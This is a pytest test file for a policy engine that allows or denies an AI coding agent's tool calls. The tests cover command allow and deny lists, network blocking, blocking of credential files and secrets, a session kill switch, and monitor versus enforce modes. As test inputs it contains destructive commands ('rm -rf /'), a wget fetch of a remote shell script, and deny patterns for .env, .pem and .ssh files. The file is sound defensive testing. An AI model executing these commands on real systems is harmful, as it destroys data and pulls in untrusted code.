"""Tests for the governance engine."""

import pytest
from tealtiger_openhands.engine import GovernanceEngine
from tealtiger_openhands.policy import (
    GovernancePolicy, FilePolicy, CommandPolicy, SecretScanPolicy, BudgetPolicy,
)
from tealtiger_openhands.decision import DecisionAction


def _make_event(tool_name, tool_input, session_id="test-session"):
    return {
        "event_type": "PreToolUse", "tool_name": tool_name,
        "tool_input": tool_input, "session_id": session_id,
        "working_dir": "/workspace",
    }


class TestCommandGovernance:
    def test_allowed_command(self):
        policy = GovernancePolicy(mode="ENFORCE", command_policy=CommandPolicy(allowlist=["python", "pytest"]))
        engine = GovernanceEngine(policy)
        decision = engine.evaluate(_make_event("terminal", {"command": "python test.py"}))
        assert decision.action == DecisionAction.ALLOW

    def test_denied_command(self):
        policy = GovernancePolicy(mode="ENFORCE", command_policy=CommandPolicy(denylist=["rm -rf"]))
        engine = GovernanceEngine(policy)
        decision = engine.evaluate(_make_event("terminal", {"command": "rm -rf /tmp/data"}))
        assert decision.action == DecisionAction.DENY
        assert "COMMAND_DENIED" in decision.reason_codes

    def test_network_access_blocked(self):
        policy = GovernancePolicy(mode="ENFORCE", command_policy=CommandPolicy(block_network_access=True))
        engine = GovernanceEngine(policy)
        decision = engine.evaluate(_make_event("terminal", {"command": "wget https://example.com/shell.sh"}))
        assert decision.action == DecisionAction.DENY


class TestFileGovernance:
    def test_read_denied_env(self):
        policy = GovernancePolicy(mode="ENFORCE", file_policy=FilePolicy(read_denylist=[".env*"]))
        engine = GovernanceEngine(policy)
        decision = engine.evaluate(_make_event("file_editor", {"command": "view", "path": ".env"}))
        assert decision.action == DecisionAction.DENY
        assert "FILE_ACCESS_DENIED" in decision.reason_codes

    def test_write_with_secret_blocked(self):
        policy = GovernancePolicy(mode="ENFORCE", secret_scan=SecretScanPolicy(enabled=True, action="block"))
        engine = GovernanceEngine(policy)
        decision = engine.evaluate(_make_event("file_editor", {
            "command": "create", "path": "src/config.py",
            "file_text": 'api_key = "test_fake_key_aaaaaabbbbbbccccccdddddd"\n',
        }))
        assert decision.action == DecisionAction.DENY
        assert "SECRET_DETECTED" in decision.reason_codes


class TestKillSwitch:
    def test_freeze_blocks_session(self):
        policy = GovernancePolicy(mode="ENFORCE")
        engine = GovernanceEngine(policy)
        engine.freeze("test-session")
        decision = engine.evaluate(_make_event("terminal", {"command": "echo hello"}, session_id="test-session"))
        assert decision.action == DecisionAction.DENY
        assert "SESSION_FROZEN" in decision.reason_codes

    def test_unfreeze_allows_again(self):
        policy = GovernancePolicy(mode="ENFORCE")
        engine = GovernanceEngine(policy)
        engine.freeze("test-session")
        engine.unfreeze("test-session")
        decision = engine.evaluate(_make_event("terminal", {"command": "echo hello"}, session_id="test-session"))
        assert decision.action == DecisionAction.ALLOW


class TestModeLogic:
    def test_monitor_logs_but_allows(self):
        policy = GovernancePolicy(mode="MONITOR", command_policy=CommandPolicy(denylist=["rm -rf"]))
        engine = GovernanceEngine(policy)
        decision = engine.evaluate(_make_event("terminal", {"command": "rm -rf /"}))
        assert decision.action == DecisionAction.ALLOW
        assert "MODE_PASSTHROUGH" in decision.reason_codes

    def test_enforce_blocks(self):
        policy = GovernancePolicy(mode="ENFORCE", command_policy=CommandPolicy(denylist=["rm -rf"]))
        engine = GovernanceEngine(policy)
        decision = engine.evaluate(_make_event("terminal", {"command": "rm -rf /"}))
        assert decision.action == DecisionAction.DENY


class TestPerformance:
    def test_evaluation_under_5ms(self):
        policy = GovernancePolicy(
            mode="ENFORCE",
            file_policy=FilePolicy(read_denylist=[".env*", "**/*.pem", ".ssh/**"]),
            command_policy=CommandPolicy(allowlist=["python", "pytest", "pip", "git"], denylist=["rm -rf"], block_network_access=True),
            secret_scan=SecretScanPolicy(enabled=True),
            budget=BudgetPolicy(per_session_usd=5.0, max_iterations=100),
        )
        engine = GovernanceEngine(policy)
        decision = engine.evaluate(_make_event("terminal", {"command": "python -m pytest tests/"}))
        assert decision.evaluation_time_ms < 5.0
